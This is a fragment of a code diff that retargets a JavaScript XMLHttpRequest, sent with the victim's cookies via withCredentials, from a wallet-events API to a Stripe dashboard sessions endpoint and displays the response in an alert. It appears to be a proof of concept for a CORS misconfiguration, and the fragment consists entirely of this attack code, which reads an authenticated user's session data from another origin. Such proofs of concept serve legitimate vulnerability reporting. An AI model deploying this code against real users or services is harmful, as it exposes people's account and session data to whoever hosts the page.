@@ -16,7 +16,7 @@ if (this.readyState == 4 && this.status == 200) {
 document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };
-xhttp.open("GET", "https://api.arkane.network/api/wallets/15cf17b6-9d41-42bb-9078-9cbeffbd1c88/events", true);
+xhttp.open("GET", "https://dashboard.stripe.com/ajax/sessions", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
